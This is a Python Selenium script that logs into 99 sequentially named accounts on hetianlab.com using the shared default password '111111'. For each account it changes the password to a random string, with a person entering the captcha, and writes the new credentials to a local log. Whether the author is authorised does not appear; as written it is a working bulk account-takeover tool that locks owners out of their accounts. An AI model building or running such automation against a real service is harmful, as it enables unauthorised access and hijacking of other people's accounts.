import os
import random
from PIL import Image
from selenium import webdriver


class fuckCTF:
    
    def __init__(self, username, old_password):
        self.url = "http://hetianlab.com/"
        self.login_url = "http://hetianlab.com/loginLab.do"
        self.username = username
        self.old_password = old_password
        self.new_password = (self.yield_new_password(), "111111")[0]
        self.options = webdriver.FirefoxOptions()
        self.options.add_argument("-headless")
        self.browser = webdriver.Firefox(options=self.options)
        print("init ok")
    
    def login_hetian(self):
        self.browser.get(self.login_url)
        self.browser.find_element_by_id("userEmail").clear()
        self.browser.find_element_by_id("userEmail").send_keys(self.username)
        self.browser.find_element_by_id("passwordIn").clear()
        self.browser.find_element_by_id("passwordIn").send_keys(self.old_password)
        self.browser.get_screenshot_as_file(self.username + '/' + "login.png")
        self.browser.find_element_by_id("registButIn").click()
        self.browser.get(self.url)
        print("login_hetian running ok!")
        
    def get_personl_information_page(self):
        grzx_btn = self.browser.find_element_by_xpath("/html/body/div[1]/div[1]/div/div/div[2]/ul/li[2]/a")
        self.browser.execute_script("$(arguments[0]).click()", grzx_btn)
        self.browser.get("http://hetianlab.com/getUserInfo.do")
        print("get_personl_information_page running ok!")
        
    def get_password_setting_page(self):
        mmsz_btn = self.browser.find_element_by_xpath("/html/body/div[2]/div/div[1]/ul/ul[3]/li[2]")
        self.browser.execute_script("$(arguments[0]).click()", mmsz_btn)
        self.browser.find_element_by_id("person").click()
        self.browser.find_element_by_class_name("check")
        print("get_password_setting_page running ok!")
    
    def yield_new_password(self):
        strings = list("abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()")
        return "".join(random.choices(strings, k=6))
    
    def setting_password(self):
        self.browser.find_element_by_id("oldpwd").clear()
        self.browser.find_element_by_id("oldpwd").send_keys(self.old_password)
        self.browser.find_element_by_id("newpwd").clear()
        self.browser.find_element_by_id("newpwd").send_keys(self.new_password)
        self.browser.find_element_by_id("quepwd").clear()
        self.browser.find_element_by_id("quepwd").send_keys(self.new_password)
        print("setting_password running ok!")
        
    def get_v_code(self):
        status = self.browser.get_screenshot_as_file(self.username + '/' + "v_code.png")
        if status:
            img = Image.open(self.username + '/' + "v_code.png")
            img.show()
            self.v_code = input("请输入验证码: ")
            self.browser.find_element_by_class_name("code").send_keys(self.v_code)
        else:
            raise("截屏失败！")
        print("get_v_code running ok!")
        
    def submit_data(self):
        self.browser.find_element_by_id("submitbtn").click()
        self.browser.get_screenshot_as_file(self.username + '/' + "result.png")
        self.browser.quit()
        print("submit_data running ok!")
        
    def make_portfolio(self):
        if not os.path.exists(self.username):
            os.makedirs(self.username)
        print("make_portfolio running ok!")
        
    def save_success_data(self):
        with open("./username_and_password_data_successed.log", "a+") as fp:
            fp.write(
                "username" + ": {}".format(self.username) + "\t"
                "password" + ": {}".format(self.new_password) + 
                "\n"
            )
        print("save_success_data running ok!")
    
    def save_failed_data(self):
        with open("./username_and_password_data_failed.log", "a+") as fp:
            fp.write(
                "username" + ": {}".format(self.username) + "\n"
            )
        print("save_failed_data running ok!")
        
    def main(self):
        try:
            self.make_portfolio()
            self.login_hetian()
            self.get_personl_information_page()
            self.get_password_setting_page()
            self.setting_password()
            self.get_v_code()
            self.submit_data()
            self.save_success_data()
        except:
            self.save_failed_data()

            
def yield_usernames(n):
    prefix = "ctf2018_gzhu"
    postfix = "@dh.com"
    for num in range(1, n):
        if num < 10:
            infix = '0' + str(num)
        else:
            infix = str(num)
        yield prefix + infix + postfix

    
if __name__ == "__main__":
    for username in yield_usernames(100):
        ctfer = fuckCTF(username, "111111")
        ctfer.main()
